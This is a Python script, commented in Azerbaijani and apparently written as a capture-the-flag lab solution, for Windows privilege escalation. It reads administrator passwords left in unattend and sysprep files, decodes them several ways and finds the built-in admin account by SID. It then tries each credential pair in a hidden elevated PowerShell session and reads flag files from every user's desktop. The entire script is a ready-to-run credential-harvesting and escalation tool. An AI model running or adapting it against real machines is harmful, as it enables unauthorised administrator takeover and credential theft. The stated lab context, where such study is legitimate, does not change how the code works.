#!/usr/bin/env python3
"""
unattend_privesc.py  (v2 - robust decode + auto username detection)
=====================================================================
Windows Privilege Escalation vasitesile Unattended Installation Files.

DEYISIKLIKLER (v1 -> v2), real LAB01 testinde tapilan problemlere gore:

  - v1: <PlainText>true</PlainText> gorende hec decode etmirdi -> lab
    faylinda bu bayraq YANLIS/aldadici oldugu ucun sifre hec vaxt duzgun
    cixarilmirdi (xam base64 setri sifre kimi qebul edilirdi).
    v2: PlainText bayragina "kor-koranə" etibar etmir, BIR NECE decode
    strategiyasini paralel sinayir (UTF-16LE+suffix VE sade tek-qat
    base64) ve netice icindeki "temiz" (cap oluna bilen) namizedleri
    prioritetlesdirir.

  - v1: hedef useri hemise "Administrator" hesab edirdi.
    v2: Get-LocalUser ile SID-i "-500" ile biten (yeni built-in
    Administrator hesabi, adi ne olursa olsun) hesabi avtomatik askar
    edir; tapa bilmese "SuperAdministrator" ve "Administrator"-u ehtiyat
    namized kimi sinayir.

  - v2: her (username, password) kombinasiyasini novbe ile sinayir,
    ugurlu olanda dayanir; Desktop yolunu "C:\\Users\\*\\Desktop"
    wildcard ile axtarir (profil qovlugunun deqiq adindan asili olmadan).

ISTIFADE:
    python unattend_privesc.py

QEYD: Bu skript YALNIZ icazeli, tehsil meqsedli laboratoriya muhitlerinde
      (Holberton/ALX Windows Privilege Escalation modulu, LAB01 VM) istifade
      ucundur. Sifre hec bir yerde hardcode edilmir - butunlukle runtime-da
      hedef sistemin ozunden cixarilir.
"""

import os
import re
import base64
import subprocess
import tempfile
import sys

# ---------------------------------------------------------------------------
# 1. TYPICAL FILE LOCATIONS
# ---------------------------------------------------------------------------
UNATTEND_CANDIDATE_PATHS = [
    r"C:\unattend.xml",
    r"C:\Windows\Panther\Unattend.xml",
    r"C:\Windows\Panther\Unattended.xml",
    r"C:\Windows\Panther\Unattend\Unattend.xml",
    r"C:\Windows\Panther\Unattend\Unattended.xml",
    r"C:\Windows\System32\Sysprep\sysprep.xml",
    r"C:\Windows\System32\Sysprep\Panther\Unattend.xml",
    r"C:\Windows\System32\sysprep.inf",
]

# ---------------------------------------------------------------------------
# 2. PASSWORD EXTRACTION (regex)
# ---------------------------------------------------------------------------
ADMIN_BLOCK_RE = re.compile(
    r"<AdministratorPassword>(.*?)</AdministratorPassword>", re.IGNORECASE | re.DOTALL
)
VALUE_RE = re.compile(r"<Value>(.*?)</Value>", re.IGNORECASE | re.DOTALL)
PLAINTEXT_RE = re.compile(r"<PlainText>(.*?)</PlainText>", re.IGNORECASE | re.DOTALL)


def find_unattend_files():
    """Standart yollarda movcud olan unattend/sysprep fayllarini qaytarir."""
    return [p for p in UNATTEND_CANDIDATE_PATHS if os.path.isfile(p)]


def extract_admin_password_field(filepath):
    """<AdministratorPassword> blokundan <Value> ve <PlainText> cixarir."""
    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
    except (PermissionError, FileNotFoundError) as e:
        print(f"[!] {filepath} oxuna bilmedi: {e}")
        return None, None

    block_match = ADMIN_BLOCK_RE.search(content)
    if not block_match:
        return None, None

    block = block_match.group(1)
    value_match = VALUE_RE.search(block)
    plaintext_match = PLAINTEXT_RE.search(block)

    value = value_match.group(1).strip() if value_match else None
    is_plaintext = (
        plaintext_match is not None
        and plaintext_match.group(1).strip().lower() == "true"
    )
    return value, is_plaintext


# ---------------------------------------------------------------------------
# 3. DECODING  (v2: coxlu strategiya, PlainText bayragina kor-koranə guvenmir)
# ---------------------------------------------------------------------------
def decode_unattend_password(value, is_plaintext, suffix="AdministratorPassword"):
    """
    Sifreni bir nece mumkun strategiya ile desifre etmeye calisir ve
    temiz (cap oluna bilen) namizedlerin siyahisini qaytarir, en cox
    ehtimal olunandan basliyaraq. Duplikatlari silir.

    Strategiya A: XML "PlainText=true" deyir -> deyer artiq aciq metndir.
    Strategiya B: Microsoft-un resmi qaydasi -> Base64(UTF16LE(sifre+suffix)).
    Strategiya C: Bezi CTF/lab muhitleri MS qaydasini izlemir, sadece
                  sifreni birbasa tek-qat Base64(ASCII/UTF-8)-e cevirir
                  (hec UTF-16LE, hec suffix olmadan) - bizim LAB01
                  numunemizde MEHZ bu hal bas verdi.
    """
    if value is None:
        return []

    candidates = []

    if is_plaintext:
        candidates.append(value)

    try:
        raw = base64.b64decode(value)
        utf16_decoded = raw.decode("utf-16-le", errors="ignore")
        if utf16_decoded.endswith(suffix):
            candidates.append(utf16_decoded[: -len(suffix)])
        candidates.append(utf16_decoded)
    except Exception:
        pass

    try:
        raw = base64.b64decode(value)
        ascii_decoded = raw.decode("utf-8", errors="ignore")
        candidates.append(ascii_decoded)
    except Exception:
        pass

    def is_clean(s):
        return bool(s) and s.isprintable() and "\x00" not in s

    clean = [c for c in candidates if is_clean(c)]
    seen = set()
    ordered_clean = [c for c in clean if not (c in seen or seen.add(c))]

    return ordered_clean if ordered_clean else candidates


# ---------------------------------------------------------------------------
# 3b. BUILT-IN ADMIN HESABININ ADINI AVTOMATIK ASKAR ETME
# ---------------------------------------------------------------------------
def find_builtin_admin_username():
    """
    Yerli built-in Administrator hesabini (SID-i '...-500' ile bitir)
    tapmaga calisir - hesab 'SuperAdministrator' kimi yeniden adlandirilmis
    olsa bele duzgun useri avtomatik askar edir.
    """
    try:
        result = subprocess.run(
            [
                "powershell", "-NoProfile", "-Command",
                "(Get-LocalUser | Where-Object { $_.SID -like '*-500' }).Name",
            ],
            capture_output=True, text=True, timeout=15,
        )
        name = result.stdout.strip()
        return name if name else None
    except Exception as e:
        print(f"[!] Yerli admin hesabi avtomatik askar edile bilmedi: {e}")
        return None


# ---------------------------------------------------------------------------
# 4. ADMIN SESSION (PSCredential ile elevation)
# ---------------------------------------------------------------------------
def spawn_admin_session_and_read_flag(username, password):
    """
    Verilen (username, password) cutu ile elevated PowerShell sessiyasi
    acmaga calisir. Ugurlu olarsa, butun C:\\Users\\*\\Desktop qovluqlarinda
    '*flag*' fayllarini axtarib mezmununu cap edir ve True qaytarir.
    Ugursuz olarsa (yanlis credential) sakit sekilde False qaytarir ki,
    novbeti namized sinana bilsin.
    """
    tmp_out = os.path.join(tempfile.gettempdir(), "unattend_flag_out.txt")
    if os.path.exists(tmp_out):
        os.remove(tmp_out)

    inner_cmd = (
        "$flagFiles = Get-ChildItem -Path 'C:\\Users\\*\\Desktop' "
        "-Filter '*flag*' -ErrorAction SilentlyContinue; "
        "foreach ($f in $flagFiles) { Get-Content $f.FullName } "
        f"| Out-File -FilePath '{tmp_out}' -Encoding utf8"
    )

    ps_launcher = (
        f'$secPass = ConvertTo-SecureString "{password}" -AsPlainText -Force; '
        f'$cred = New-Object System.Management.Automation.PSCredential("{username}", $secPass); '
        f'try {{ Start-Process powershell.exe -Credential $cred -WindowStyle Hidden '
        f'-ArgumentList "-NoProfile","-Command","{inner_cmd}" -Wait -ErrorAction Stop }} '
        f'catch {{ Write-Output "ELEVATION_FAILED" }}'
    )

    result = subprocess.run(
        ["powershell", "-NoProfile", "-Command", ps_launcher],
        capture_output=True, text=True,
    )

    if "ELEVATION_FAILED" in result.stdout or "ELEVATION_FAILED" in (result.stderr or ""):
        print(f"    [-] {username} / {password!r} -> credential-lar redd edildi.")
        return False

    if os.path.exists(tmp_out):
        with open(tmp_out, "r", encoding="utf-8", errors="ignore") as f:
            flag_content = f.read().strip()
        if flag_content:
            print(f"\n[+] UGUR!  Username: {username}   Password: {password}")
            print(f"[+] FLAG:\n{flag_content}\n")
            return True

    print(f"    [-] {username} / {password!r} -> elevated sessiya acildi, amma flag tapilmadi.")
    return False


# ---------------------------------------------------------------------------
# MAIN
# ---------------------------------------------------------------------------
def main():
    print("[*] Unattended installation faylları axtarılır...\n")
    files = find_unattend_files()

    if not files:
        print("[-] Standart yollarda hec bir unattend/sysprep fayli tapilmadi.")
        sys.exit(1)

    for filepath in files:
        print(f"[+] Tapildi: {filepath}")
        value, is_plaintext = extract_admin_password_field(filepath)

        if value is None:
            print("    [-] Bu faylda <AdministratorPassword> sahesi tapilmadi.\n")
            continue

        password_candidates = decode_unattend_password(value, is_plaintext)
        if not password_candidates:
            print("    [-] Sifre desifre edile bilmedi.\n")
            continue

        print(f"    [+] Mumkun sifre namizedleri: {password_candidates}")

        detected_user = find_builtin_admin_username()
        username_candidates = []
        for u in [detected_user, "SuperAdministrator", "Administrator"]:
            if u and u not in username_candidates:
                username_candidates.append(u)

        print(f"    [+] Yoxlanacaq istifadeci adlari: {username_candidates}\n")

        for username in username_candidates:
            for password in password_candidates:
                print(f"[*] Cehd olunur: {username} / {password}")
                if spawn_admin_session_and_read_flag(username, password):
                    return
        print()

    print("[-] Hec bir (username, password) kombinasiyasi ile elevated sessiya acila bilmedi.")


if __name__ == "__main__":
    main()
